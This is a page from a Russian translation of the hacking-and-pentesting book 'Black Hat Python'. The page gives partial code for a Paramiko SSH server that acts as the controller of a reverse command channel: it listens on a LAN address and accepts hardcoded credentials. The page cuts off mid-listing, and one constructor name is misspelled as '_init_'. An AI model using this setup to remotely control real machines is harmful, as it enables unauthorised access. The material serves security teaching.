# Black Hat Python. Программирование для хакеров и пентестеров — страница 47

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

SSH с применением Paramiko   47
Также заметьте, что в качестве первой команды мы шлем ClientConnec-
ted . Причину этого вы поймете, когда будет создана обратная сторона
SSH-соединения.
Т еперь напишем программу , которая создаст SSH-сервер, чтобы к нему мог
подключиться наш SSH-клиент, на стороне которого будут выполняться
команды. Он может работать в системе под управлением Linux, Windows
или даже macOS — главное, чтобы там были установлены Python и  Paramiko.
Создайте файл с именем ssh_server.py и наберите следующее:
import os
import paramiko
import socket
import sys
import threading
CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key')) 
class Server (paramiko.ServerInterface): 
    def _init_(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'tim') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL
if __name__ == '__main__':
    server = '192.168.1.207'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port)) 
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)
    bhSession = paramiko.Transport(client) 
